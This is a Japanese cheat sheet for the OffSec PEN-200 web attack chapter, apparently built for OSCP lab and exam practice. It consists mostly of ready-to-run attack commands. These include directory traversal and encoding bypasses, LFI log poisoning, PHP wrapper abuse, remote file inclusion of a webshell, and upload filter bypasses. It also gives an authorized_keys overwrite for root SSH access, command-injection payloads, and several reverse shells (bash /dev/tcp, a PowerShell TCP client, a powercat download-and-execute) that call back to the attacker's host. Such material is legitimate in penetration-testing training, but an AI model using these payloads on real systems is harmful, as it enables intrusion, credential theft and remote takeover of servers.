# OffSec PEN-200 第9章 Webアプリケーション攻撃 チートシート

PEN-200 第9章「一般的なWebアプリケーション攻撃（Common Web Application Attacks）」に対応した、実技ラボおよびOSCP試験向けの実戦リファレンスです。

---

## 1. ディレクトリトラバーサル (Directory Traversal)

Webルートディレクトリ外の機密ファイルを閲覧・取得する攻撃です。ファイルの実行は行われません。

### 1.1 脆弱性の確認・基本プローブ
```bash
# Linux: /etc/passwd の読み取り確認
curl -s "http://<TARGET_IP>/index.php?page=../../../../../../../../../../etc/passwd"

# Windows: hosts ファイルの読み取り確認
curl -s "http://<TARGET_IP>/index.php?page=..\\..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"
```

### 1.2 重要ターゲットファイル一覧
| OS | ファイルパス | 狙い・用途 |
| :--- | :--- | :--- |
| **Linux** | `/etc/passwd` | 有効なローカルユーザー名、ホームディレクトリの特定 |
| **Linux** | `/home/<USER>/.ssh/id_rsa` | SSH秘密鍵の奪取（取得後は `chmod 400` してログイン） |
| **Linux** | `/var/log/apache2/access.log` | LFIログポイズニング用のWebサーバーログ |
| **Windows**| `C:\Windows\System32\drivers\etc\hosts` | トラバーサル脆弱性の有無の検証 |
| **Windows**| `C:\inetpub\wwwroot\web.config` | IIS接続情報、DBパスワード、秘密情報 |
| **Windows**| `C:\inetpub\logs\LogFiles\W3SVC1\` | IISのWebアクセスログ |
| **Windows**| `C:\xampp\apache\logs\access.log` | XAMPP環境におけるアクセスログ |

### 1.3 フィルター迂回手法 (URLエンコーディング)
`../` のブラックリスト検知を回避するため、ドット（`.`）を `%2e` に変換します。

```bash
# ドットのみをパーセントエンコード (%2e%2e/)
curl -s "http://<TARGET_IP>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# curlでURL正規化による「../」の事前削除を防ぐオプション (--path-as-is)
curl --path-as-is "http://<TARGET_IP>:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

---

## 2. ファイルインクルード (LFI / RFI)

外部または内部のファイルをWebアプリケーションの実行コンテキストに取り込み、コードを実行（RCE）させます。

### 2.1 LFI ＋ ログポイズニング (Log Poisoning)
WebサーバーログにPHPコードを書き込み、LFI経由でインクルードして実行させます。

1. **User-Agentヘッダー経由でログにPHPコードを注入**:
   ```bash
   curl -s -H "User-Agent: <?php echo system(\$_GET['cmd']); ?>" "http://<TARGET_IP>/index.php?page=admin.php"
   ```
2. **インクルードとコマンド実行の確認**:
   *※ コマンド内のスペースは `%20` でエンコード。*
   ```bash
   curl -s "http://<TARGET_IP>/index.php?page=../../../../../../../../var/log/apache2/access.log&cmd=id"
   ```
3. **リバースシェルのトリガー (Bash TCP)**:
   ```bash
   # Kali側でリスナーを起動
   nc -nvlp <LPORT>

   # URLエンコードしたBashワンライナーを送信
   curl -s "http://<TARGET_IP>/index.php?page=../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<KALI_IP>%2F<LPORT>%200%3E%261%22"
   ```

### 2.2 PHPラッパーの悪用
#### `php://filter`（ソースコード漏洩）
PHPコードを実行させずにBase64化して取得し、ハードコードされたDBパスワードなどを特定します。
```bash
# Base64でエンコードして取得
curl -s "http://<TARGET_IP>/index.php?page=php://filter/convert.base64-encode/resource=admin.php"

# 取得した文字列をKali側でデコード
echo "<BASE64_STRING>" | base64 -d
```

#### `data://`（インラインコード実行）
`allow_url_include = On` の環境で、直接コードを埋め込んで実行します。
```bash
# プレーンテキスト形式
curl -s "http://<TARGET_IP>/index.php?page=data://text/plain,<?php%20echo%20system('id');?>"

# Base64形式 (<?php echo system($_GET["cmd"]);?>)
curl -s "http://<TARGET_IP>/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=whoami"
```

### 2.3 リモートファイルインクルード (RFI)
`allow_url_include = On` の場合に、攻撃者のサーバーから直接シェルを読み込ませます。

```bash
# 1. Kali側でWebシェル配信用HTTPサーバーを起動
cd /usr/share/webshells/php/
python3 -m http.server 80

# 2. ターゲットからリモートインクルードを実行
curl -s "http://<TARGET_IP>/index.php?page=http://<KALI_IP>/simple-backdoor.php&cmd=id"
```

---

## 3. ファイルアップロード攻撃 (File Upload)

### 3.1 実行可能ファイルのアップロードと拡張子偽装
アップロード機能にブラックリスト（`.php` の禁止）が存在する場合のバイパス手法です。

* **大文字混じり拡張子**: `.pHP`, `.Php`, `.pHp`
* **代替拡張子**: `.phps`, `.php7`, `.phtml`
* **二重拡張子 / Nullバイト**: `.php.jpg`, `.php%00.jpg`

#### PowerShell リバースシェルの準備と配信 (Windowsターゲット)
```powershell
# Kali の pwsh または端末でUTF-16LE Base64を生成
$Text = '$client = New-Object System.Net.Sockets.TCPClient("<KALI_IP>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
echo $EncodedText
```
```bash
# アップロードしたWebシェル経由でエンコードされたワンライナーを実行
curl -s "http://<TARGET_IP>/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<BASE64_PAYLOAD>"
```

### 3.2 実行不可能なファイルの悪用（パストラバーサル併用）
ファイルが直接実行できない、またはWebルート外に保存される場合、ファイル名に相対パス（`../`）を注入して重要設定ファイルを上書きします。

#### `authorized_keys` の上書きによるSSH初期侵入
```bash
# 1. 攻撃用SSH鍵ペアを作成
ssh-keygen -f fileup -N ""
cat fileup.pub > authorized_keys

# 2. Burp Suiteでアップロードリクエストを捕捉し、filename を書き換え
# Content-Disposition: form-data; name="file"; filename="../../../../../../../root/.ssh/authorized_keys"

# 3. ホストキーキャッシュを消去して root でSSHログイン
rm -f ~/.ssh/known_hosts
ssh -i fileup -p 2222 root@<TARGET_IP>
```

---

## 4. OSコマンドインジェクション (Command Injection)

Webアプリケーションが背後でシェルを呼び出す際の検証不備を突きます。

### 4.1 コマンドセパレーター一覧
| セパレーター | URLエンコード | 説明 |
| :--- | :--- | :--- |
| `;` | `%3B` | コマンドを順次実行（Linux / PowerShell） |
| `&&` | `%26%26` | 直前のコマンドが成功した場合のみ次を実行 |
| `\|` | `%7C` | パイプ（標準出力を次のコマンドに渡す） |
| `&` | `%26` | バックグラウンド実行（CMD / Linux） |
|Space| `%20` | スペース |
| `\/` | `%2F` | （パスの区切りとしてなら不要な場合もある）|   

### 4.2 実行環境の特定（CMD vs PowerShell判定）
PetSerAl のスニペットを利用して、実行環境が `cmd.exe` か `powershell.exe` かを判定します。

```bash
# URLエンコードして注入
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://<TARGET_IP>:8000/archive
```

### 4.3 Powercat によるリバースシェル奪取 (PowerShell環境)
1. **Kali側で Powercat を準備・配信**:
   ```bash
   cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
   python3 -m http.server 80
   ```
2. **Kali側でNetcatリスナーを起動**:
   ```bash
   nc -nvlp <LPORT>
   ```
3. **インメモリロード ＋ リバースシェル実行ペイロード**:
   ```powershell
   IEX (New-Object System.Net.Webclient).DownloadString("http://<KALI_IP>/powercat.ps1");powercat -c <KALI_IP> -p <LPORT> -e powershell
   ```
4. **URLエンコードしてリクエスト送信**:
   ```bash
   curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<KALI_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<KALI_IP>%20-p%20<LPORT>%20-e%20powershell' http://<TARGET_IP>:8000/archive
   ```

### 4.4 Linux によるリバースシェル奪取  
1. **Kali側でNetcatリスナーを起動**:
   ```bash
   nc -nvlp <LPORT>
   ```
2. **リバースシェル実行ペイロード**:
   ```bash
   bash -i >& /dev/tcp/<KALI_IP>/<KALI_PORT> 0>&1
   ```
3. **URLエンコード(Option使用)してリクエスト送信**:
   ```bash
   curl -X POST --data-urlencode 'Archive=git;bash -i >& /dev/tcp/<KALI_IP>/<KALI_PORT> 0>&1' http://<TARGET_IP>:8000/archive
   ```
   ```bash
   ### --url-encodeは入力ごとにつける。Bashが通らないときは bash -c "~"でくくる。
   curl -X POST --data-urlencode 'username=test' --data-urlencode 'password=x' --data-urlencode 'ffa=x$(bash -c "bash -i >& /dev/tcp/<KALI_IP>/<KALI_PORT> 0>&1")' http://$<TARGET_IP>/login
   ```
